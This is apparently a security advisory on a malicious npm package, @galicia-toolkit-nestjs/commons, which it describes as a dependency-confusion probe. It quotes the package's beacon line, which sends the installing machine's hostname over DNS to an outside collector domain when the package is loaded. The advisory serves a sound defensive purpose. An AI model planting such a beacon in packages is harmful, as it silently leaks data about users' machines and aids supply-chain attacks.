summary: Dependency-confusion beacon exfiltrates hostname via DNS on require()
details: @galicia-toolkit-nestjs/commons@3.0.1 is a 417-byte stub that exports no-op forRoot and createLogger implementations and contains no real functionality. On require(), it schedules a delayed DNS resolution of a subdomain constructed from os.hostname() under the hardcoded out-of-band collector domain c3.dc.oob.s4yhii.com (require('dns').resolve(h + '.c3.dc.oob.s4yhii.com',...)). This leaks the installing host's identifier to a third-party DNS collector that is unrelated to the declared NestJS commons purpose. The scoped name, stub surface, and OOB beacon shape are consistent with a dependency-confusion probe designed to detect internal resolution of the @galicia-toolkit-nestjs scope.
